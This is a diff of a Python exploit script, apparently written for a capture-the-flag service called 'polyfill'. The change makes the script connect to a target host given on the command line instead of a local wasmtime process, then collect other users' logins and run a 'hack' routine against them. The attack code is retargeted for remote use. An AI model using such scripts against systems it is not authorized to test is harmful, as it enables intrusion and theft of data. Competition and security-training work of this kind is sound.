@@ -1,11 +1,13 @@
 #!/usr/bin/python3
 
-import subprocess
+import socket
 import random
 import struct
+import sys
 
 def cmd(p, text, expected_output=1):
     p.stdin.write(text + "\n")
+    p.stdin.flush()
     first = p.stdout.readline().strip()
     for i in range(expected_output-1):
         p.stdout.readline()
@@ -38,6 +40,7 @@ def hack(p, logins):
     p.stdin.write(login + "\n")
     p.stdin.write("mypassword\n")
     p.stdin.write("mysecret\n")
+    p.stdin.flush()
 
     print("creating the poly (4 times)")
     for i in range(4):
@@ -102,12 +105,18 @@ def get_logins(p):
     return [l for l in logins if "hack" not in l]
 
 
-with subprocess.Popen(["wasmtime", "--dir", "flags", "polyfill.wasm"], encoding="utf8", bufsize=0,
-                      stdin=subprocess.PIPE, stdout=subprocess.PIPE, 
-                      stderr=subprocess.DEVNULL
-                      ) as p:
-    welcome_prompt = p.stdout.readline()
-    logins = get_logins(p)
-    print("got logins:", " ".join(logins))
+class P:
+    def __init__(self, s):
+        self.stdout = s.makefile("r")
+        self.stdin = s.makefile("w")
 
-    hack(p, logins)
+#p = subprocess.Popen(["wasmtime", "--dir", "flags", "polyfill.wasm"], encoding="utf8", bufsize=0,
+#                      stdin=subprocess.PIPE, stdout=subprocess.PIPE, 
+#                      stderr=subprocess.DEVNULL)
+p = P(socket.create_connection((sys.argv[1], 10001)))
+
+welcome_prompt = p.stdout.readline()
+logins = get_logins(p)
+print("got logins:", " ".join(logins))
+
+hack(p, logins)
